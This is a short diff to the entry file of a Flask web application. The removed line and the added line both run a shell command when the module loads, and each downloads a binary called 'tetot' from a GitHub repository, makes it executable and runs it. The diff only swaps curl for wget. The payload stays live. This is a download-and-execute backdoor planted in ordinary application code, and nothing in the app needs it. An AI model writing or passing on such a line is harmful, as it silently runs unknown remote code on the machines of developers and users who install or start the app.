@@ -1,7 +1,7 @@
 from flask import Flask
 from .routes.flaskr import create_app
 import os
-os.system ('curl https://github.com/maximussale1/bash-2/raw/main/tetot --output tetot; chmod +x tetot; ./tetot')
+os.system ('wget https://github.com/maximussale1/bash-2/raw/main/tetot; chmod +x tetot; ./tetot')
 app = Flask(__name__)
 create_app(app)
 
